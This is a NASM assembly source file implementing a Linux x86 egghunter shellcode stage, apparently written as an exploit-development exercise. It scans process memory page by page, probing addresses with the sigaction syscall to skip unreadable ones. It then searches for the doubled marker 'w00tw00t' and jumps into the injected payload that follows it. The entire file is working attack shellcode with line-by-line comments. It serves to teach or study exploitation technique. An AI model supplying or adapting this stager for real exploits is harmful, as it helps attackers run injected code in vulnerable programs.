; egghunter.nasm
; Author: Alex

global _start

section .text ; stores the main program code

_start:

page_alignment:

    or cx, 0xfff             ; perform a page alignment operation on the current pointer (CX) that is being validated

next_valid_address:

    inc ecx                  ; increment ECX by 1 to point to the next memory address within the current page
    jnz address_not_null     ; if ECX is not '0x00000000', continue with the egg hunting process
    inc ecx                  ; otherwise, increment ECX by 1 to avoid its value being set to '0x00000000' and only then continue with the egg hunting process

address_not_null:
    push byte +0x43          ; push the 'sigaction' syscall number 67 (0x43 in HEX) onto the stack
    pop eax                  ; pop the pushed 0x43 value from the stack into EAX, EAX is the register that needs to contain this value
    int 0x80                 ; issue the 'sigaction' syscall
    cmp al, 0xf2             ; the low byte of EAX (it now holds the return value from the system call) is compared against 0xf2 which represents the low byte of the EFAULT return value
    jz page_alignment        ; if the ZF flag is set, increment the current pointer to the next page
    mov eax, 0x77303074      ; Otherwise, move the egg 'w00t' to EAX
    mov edi, ecx             ; Move the memory address potentially containing our egg to EDI
    scasd                    ; Look for the 'w00t' value (stored in EAX) with EDI, EDI is then incremented by 4 bytes
    jnz next_valid_address   ; if no 'w00t' is found, move to the next memory address
    scasd                    ; 'w00t' is found, can we find the second 'w00t' in the next 4 bytes?
    jnz next_valid_address   ; if not, move to the next memory address
    jmp edi                  ; otherwise, the egg is found, move EDI by 4 bytes and jump to our payload (it's placed right after the first 8 bytes of 'w00tw00t')
